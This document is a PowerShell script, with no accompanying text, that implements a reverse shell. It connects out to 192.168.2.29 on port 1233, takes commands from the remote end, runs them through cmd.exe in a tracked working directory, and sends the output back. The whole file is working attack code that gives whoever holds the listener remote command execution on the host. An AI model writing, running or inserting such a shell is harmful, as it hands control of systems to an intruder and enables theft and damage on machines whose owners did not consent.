$client = New-Object System.Net.Sockets.TCPClient("192.168.2.29", 1233)
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

# Initialize the working directory
$workingDirectory = cd

while ($true) {
    try {
        # Send prompt with the current working directory
        $prompt = "$workingDirectory> "
        $writer.Write($prompt)
        
        # Read the command from the client
        $command = $reader.ReadLine()
        if ($command -eq "exit") { break }

        # Handle directory commands
        if ($command -match "^cd\s+(.*)$") {
            $newDirectory = $matches[1]
            if ($newDirectory -eq "..") {
                $workingDirectory = [System.IO.Path]::GetDirectoryName($workingDirectory)
            } elseif ($newDirectory -eq "\") {
                $workingDirectory = "C:\"
            } else {
                $fullPath = [System.IO.Path]::Combine($workingDirectory, $newDirectory)
                if (Test-Path $fullPath -and (Test-Path $fullPath -PathType Container)) {
                    $workingDirectory = $fullPath
                } else {
                    $writer.WriteLine("Error: Directory not found")
                }
            }
            continue
        }

        $output = & cmd.exe /c "cd $workingDirectory && $command" 2>&1

        # Format the output as a string and send it back to the client
        $formattedOutput = $output -join "`n"
        $writer.WriteLine($formattedOutput)
    } catch {
        $writer.WriteLine("Error: $_")
    }
}

$client.Close()
